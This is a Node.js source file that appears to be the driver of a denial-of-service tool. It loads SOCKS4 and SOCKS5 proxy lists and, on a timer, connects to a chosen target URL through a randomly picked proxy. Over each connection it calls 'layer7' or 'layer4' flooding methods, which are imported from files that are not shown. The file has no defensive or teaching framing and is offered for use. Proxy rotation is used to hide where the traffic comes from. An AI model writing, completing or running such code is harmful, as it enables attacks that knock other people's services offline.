const http = require('http');
const fs = require('fs');
const { SocksClient } = require('socks');
const layer7 = require('./methods/layer7');
const layer4 = require('./methods/layer4');

const socks4Proxies = fs.readFileSync('socks4.txt', 'utf8').split('\n').filter(Boolean);
const socks5Proxies = fs.readFileSync('socks5.txt', 'utf8').split('\n').filter(Boolean);

async function sendPacket(targetUrl, proxy, delay, kbSize, method) {
    return new Promise((resolve, reject) => {
        const [proxyIp, proxyPort] = proxy.split(':');
        const target = new URL(targetUrl);

        const options = {
            proxy: {
                ipaddress: proxyIp,
                port: parseInt(proxyPort),
                type: socks4Proxies.includes(proxy) ? 4 : 5, 
            },
            destination: {
                host: target.hostname,
                port: target.port || 80,
            },
            command: 'connect',
            timeout: 5000, 
        };

        SocksClient.createConnection(options, (err, info) => {
            if (err) {
                console.error(`Failed to connect to ${targetUrl} via ${proxy}: ${err.message}`);
                reject(err);
                return;
            }

            if (method.startsWith('layer7')) {
                layer7[method](info.socket, target, kbSize);
            } else if (method.startsWith('layer4')) {
                layer4[method](info.socket, target, kbSize);
            }

            console.log(`Packet sent to ${targetUrl} via ${proxy} with method ${method}`);
            resolve();
        });
    });
}

function start(targetUrl, delay, kbSize, method) {
    setInterval(() => {
        const proxyList = Math.random() < 0.5 ? socks4Proxies : socks5Proxies;
        const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];

        sendPacket(targetUrl, proxy, delay, kbSize, method).catch((err) => {
            if (err.code === 'ECONNRESET') {
                console.error(`Connection reset by ${proxy}. Retrying with another proxy...`);
            } else {
                console.error(`Error with ${proxy}: ${err.message}`);
            }
        });
    }, delay);
}

module.exports = { start };
